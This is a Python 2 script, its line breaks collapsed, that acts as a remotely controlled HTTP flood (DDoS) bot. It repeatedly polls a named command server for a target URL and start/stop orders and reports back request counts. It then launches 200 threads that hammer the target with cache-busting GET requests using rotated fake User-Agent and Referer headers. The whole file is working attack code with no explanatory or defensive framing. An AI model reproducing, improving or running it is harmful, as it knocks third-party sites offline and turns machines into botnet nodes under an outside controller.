import urllib2,urllibimport sys,timeimport threadingimport randomimport re,jsonserver="http://php-huyng.rhcloud.com/ddos.php"isRun="stop"host=""url=""headers_UA=[]headers_RE=[]kich=0many={"kich":0,"ok":0,"error":0,"key":random.randint(3,999999999)}def add_headers():        global headers_UA,headers_RE        headers_UA.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')        headers_UA.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')        headers_UA.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')        headers_UA.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')        headers_UA.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')        headers_UA.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')        headers_UA.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')        headers_RE.append('http://www.bing.com/search?q=')        headers_RE.append('http://www.google.com/?q=')def Update():    global url,host,many,isRun,server    while 1:       try:          data=urllib.urlencode(many)          request = urllib2.Request("%s?d=2&i=%s"%(server,str(random.randint(3,99999999999))),data=data)          page=urllib2.urlopen(request,timeout=5)                 data=json.load(page)          print data          url=data["url"]          host=data["host"]          isRun=data["isRun"]          #server=data["server"]       except:          print "No data server"       time.sleep(5)def HTTP():    global url,host,headers_UA,headers_RE,kich,many,isRun    while 1:      if isRun=="start":        code=200        try:          if url.count("?")>0:                param_joiner="&"          else:                param_joiner="?"          request = urllib2.Request(url + param_joiner + 'q=' + str(random.randint(3,99999999999)))          request.add_header('User-Agent', random.choice(headers_UA))          request.add_header('Cache-Control', 'no-cache')          request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')          request.add_header('Referer', random.choice(headers_RE) + url)          request.add_header('Keep-Alive', str(random.randint(110,12000)))          request.add_header('Connection', 'keep-alive')          request.add_header('Host',host)        except:           pass        try:                        page=urllib2.urlopen(request,timeout=20)                        many["kich"]=many["kich"]+len(page.read())                        many["ok"]=many["ok"]+1        except urllib2.HTTPError, e:                        code= e.code                        many["error"]=many["error"]+1                except urllib2.URLError, e:                        print "url error"        except:          print "Khac"        #print "-->%skB -CODE:%s -Sl:%s"%(str(many["kich"]/1024).split(".")[0],code,many)      add_headers()t=threading.Thread(target=Update,args=())t.start()for i in range(0,200):  t=threading.Thread(target=HTTP,args=())  t.start()
